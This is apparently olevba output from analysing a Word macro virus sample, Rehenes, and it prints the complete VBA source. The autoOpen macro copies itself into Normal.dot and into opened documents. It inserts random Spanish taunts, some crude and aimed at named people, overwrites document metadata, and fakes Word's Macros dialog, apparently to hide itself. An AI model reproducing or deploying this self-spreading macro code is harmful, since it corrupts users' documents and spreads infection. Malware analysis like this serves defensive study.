olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Rehenes-d6c22e47a889188f219a4ea79fe8537da45dce59
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Rehenes-d6c22e47a889188f219a4ea79fe8537da45dce59 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoOpen.bas 
in file: Virus.MSWord.Rehenes-d6c22e47a889188f219a4ea79fe8537da45dce59 - OLE stream: 'Macros/VBA/autoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim micro$
Dim globo$
Dim macro$
On Error GoTo -1: On Error GoTo Tumay
WordBasic.FileSummaryInfo Update:=1
Dim Chuchi As Object: Set Chuchi = WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo Chuchi
micro$ = Chuchi.Directory + "\" + Chuchi.FileName + ":autoOpen"
globo$ = "Global:autoOpen"
macro$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))
If macro$ = "NORMAL.DOT" Then
WordBasic.MacroCopy globo$, micro$
micro$ = Chuchi.Directory + "\" + Chuchi.FileName + ":HerramMacro"
globo$ = "Global:HerramMacro"
WordBasic.MacroCopy globo$, micro$
Else
WordBasic.MacroCopy micro$, globo$
micro$ = Chuchi.Directory + "\" + Chuchi.FileName + ":HerramMacro"
globo$ = "Global:HerramMacro"
WordBasic.MacroCopy micro$, globo$
End If
WordBasic.FileSaveAs Format:=1
GoTo Sigue
Tumay:
On Error GoTo -1: On Error GoTo 0
Sigue:
Abracadabra
End Sub
Private Sub Abracadabra()
Dim buejn$
Dim Valx$
RandomWord
Select Case Rnd()
Case Is < 0.4
buejn$ = "Fujimori le sigues haciendo los mandados a Montesinos?"
Case Is > 0.9
buejn$ = "No me busquen porque sino me asilo! "
Case Is < 0.5
buejn$ = "22 de Abril de 1998: Viva MaRThA! "
Case Is > 0.8
buejn$ = "La pareja del año: Fujimori y Susy Diaz...waccala!! "
Case Is < 0.6
buejn$ = "14 flores para los caidos en la crisis de los rehenes. 14 no 17! "
Case Is > 0.7
buejn$ = "Para conseguir el antivirus no sea estafado con PER de Machado contacteme en jcracker@hotmail.com"
Case Else
buejn$ = "Vendo mi casita de San Martin de Porres, preguntar por María del Carmen "
End Select
WordBasic.Insert buejn$
WordBasic.StartOfDocument
WordBasic.FileSummaryInfo Title:="Crisis de los Rehenes 2"
WordBasic.FileSummaryInfo Subject:="Operativo Chavín de Huántar"
WordBasic.FileSummaryInfo Author:="Alberto Fujimori"
WordBasic.FileSummaryInfo Keywords:="WM.Fujimori"
On Error GoTo -1: On Error GoTo Tumay
WordBasic.FileSave
GoTo Yata
Tumay:
WordBasic.MsgBox "Microsoft Word editará el documento pero con ciertas dificultades. Se recomienda quitar la protección contra escritura del disco."
GoTo Alaproxima
Yata:
Select Case Rnd()
Case Is < 0.05
Valx$ = "Al español que le robe los 65,000 dolares de Interbank: Gracias coño!"
Case Is > 0.95
Valx$ = "Quién dice que el crimen no paga? Verdad Montesinos?"
Case Is < 0.1
Valx$ = "ni el SIN, ni Fujimori ni Vladimiro podrán conmigo... Muajaja!!!"
Case Is > 0.9
Valx$ = "Oye, Rector de la UPC, porque no le cambias de contraseña a tu Correo? pornomaniaco!"
Case Is < 0.15
Valx$ = "Este 17 de junio cumplo veinte añitos, vayan con regalo: un carro, una casa, tu hermana, etc..."
Case Is > 0.85
Valx$ = "Superhenry no olvides de llevar tu vaselina!"
Case Is < 0.2
Valx$ = "Soy Johnny Cracker, Master of Cracking Activity in Peru "
Case Is > 0.8
Valx$ = "Ya me aburri de leer los correos de media UPC, sobre todo las cartas de los tortolos"
Case Is < 0.25
Valx$ = "Jorge Machado: te gusto el mailbombing que te mande en la lista computo? jiji >)"
Case Is > 0.75
Valx$ = "Pero Jorgito porque te sulfuras y te retiras de la lista, ya no hay ningun lorna a quien fastidiar, jijajija >)"
Case Is < 0.3
Valx$ = "Banco Santander: porque ponen firewall, ningun banco deberia usar firewall!! >)"
Case Is > 0.7
Valx$ = "Maldición! ahora que tengo mas de 80,000 dolares de cuentas ajenas, tengo que pagar mis impuestos!"
Case Is < 0.35
Valx$ = "Creo que mejor depositaré el dinero robado en una cuenta del Interbank, a lo mejor tengo premio >)"
Case Is > 0.65
Valx$ = "Claudia cuando te agachas me pongo como los ROBLES, cuando me besas estoy en la LUNA"
Case Is < 0.4
Valx$ = "Fujimori se divorcio de Susana porque el quiere con Montesinos, siiiii!!!! >)"
Case Is > 0.6
Valx$ = "Para los amigas Javicho nomas...toño para los amigos... he dicho! "
Case Is < 0.45
Valx$ = "Jijajija! sentadito frente a mi computadora gano y choreo mas que un secuestrador o asesino de cambistas >)"
Case Is > 0.55
Valx$ = "Desde que tengo plata y me sobran las mujeres, algunos amigos se quieren pasar al otro bando, uy! jiji >)"
Case Is < 0.5
Valx$ = "Creo que abriré mi propia linea de Combis, ruta UPC - Casanova Club, algunas chicas de la UPC laboran alli >)"
Case Else
Valx$ = "Fujimori, disculpa; pero no fue mi intensión embarazar a Keiko >)"
End Select
WordBasic.MsgBox "Mensaje del Día: " + Valx$
Alaproxima:
End Sub
Private Sub RandomWord()
Dim NumPal
WordBasic.FileSummaryInfo Update:=1
Dim datadoc As Object: Set datadoc = WordBasic.DialogRecord.DocumentStatistics(False)
WordBasic.CurValues.DocumentStatistics datadoc
NumPal = WordBasic.Int(Rnd() * WordBasic.Val(datadoc.Words))
WordBasic.StartOfDocument
WordBasic.WordRight NumPal
End Sub
-------------------------------------------------------------------------------
VBA MACRO HerramMacro.bas 
in file: Virus.MSWord.Rehenes-d6c22e47a889188f219a4ea79fe8537da45dce59 - OLE stream: 'Macros/VBA/HerramMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Ejecuta, crea, borra o revisa una macro."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.HerramMacro.MAIN"
Dim botón
ReDim CuadroLista1__$(0)
ReDim CuadroLista2__$(0)
ReDim ListaDesple1__$(3)
ListaDesple1__$(0) = "Todas las plantillas activas"
ListaDesple1__$(1) = "Normal.dot (plantilla global)"
ListaDesple1__$(2) = "Comandos de Word"
WordBasic.BeginDialog 445, 310, "Macros"
    WordBasic.Text 10, 6, 159, 13, "&Nombre de la Macro:", "Texto1"
    WordBasic.TextBox 10, 22, 250, 18, "Cuadro_de_texto1"
    WordBasic.ListBox 19, 43, 243, 152, CuadroLista1__$(), "Cuadro_de_lista1"
    WordBasic.Text 19, 201, 175, 13, "M&acros disponibles en:", "Texto2"
    WordBasic.DropListBox 19, 216, 400, 50, ListaDesple1__$(), "ListaDesplegable1"
    WordBasic.Text 19, 240, 91, 13, "D&escripción", "Texto4"
    WordBasic.ListBox 19, 256, 402, 50, CuadroLista2__$(), "Cuadro_de_lista2"
    WordBasic.PushButton 286, 10, 140, 21, "Graba&r", "Presionar1"
    WordBasic.CancelButton 286, 35, 140, 21
    WordBasic.PushButton 286, 65, 140, 21, "Ejecutar", "Presionar2"
    WordBasic.PushButton 286, 90, 140, 21, "Crear", "Presionar3"
    WordBasic.PushButton 286, 115, 140, 21, "Eliminar", "Presionar4"
    WordBasic.PushButton 286, 145, 140, 21, "&Organizador...", "Presionar5"
WordBasic.EndDialog
Dim diálogoEjem As Object: Set diálogoEjem = WordBasic.CurValues.UserDialog
botón = WordBasic.Dialog.UserDialog(diálogoEjem)
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

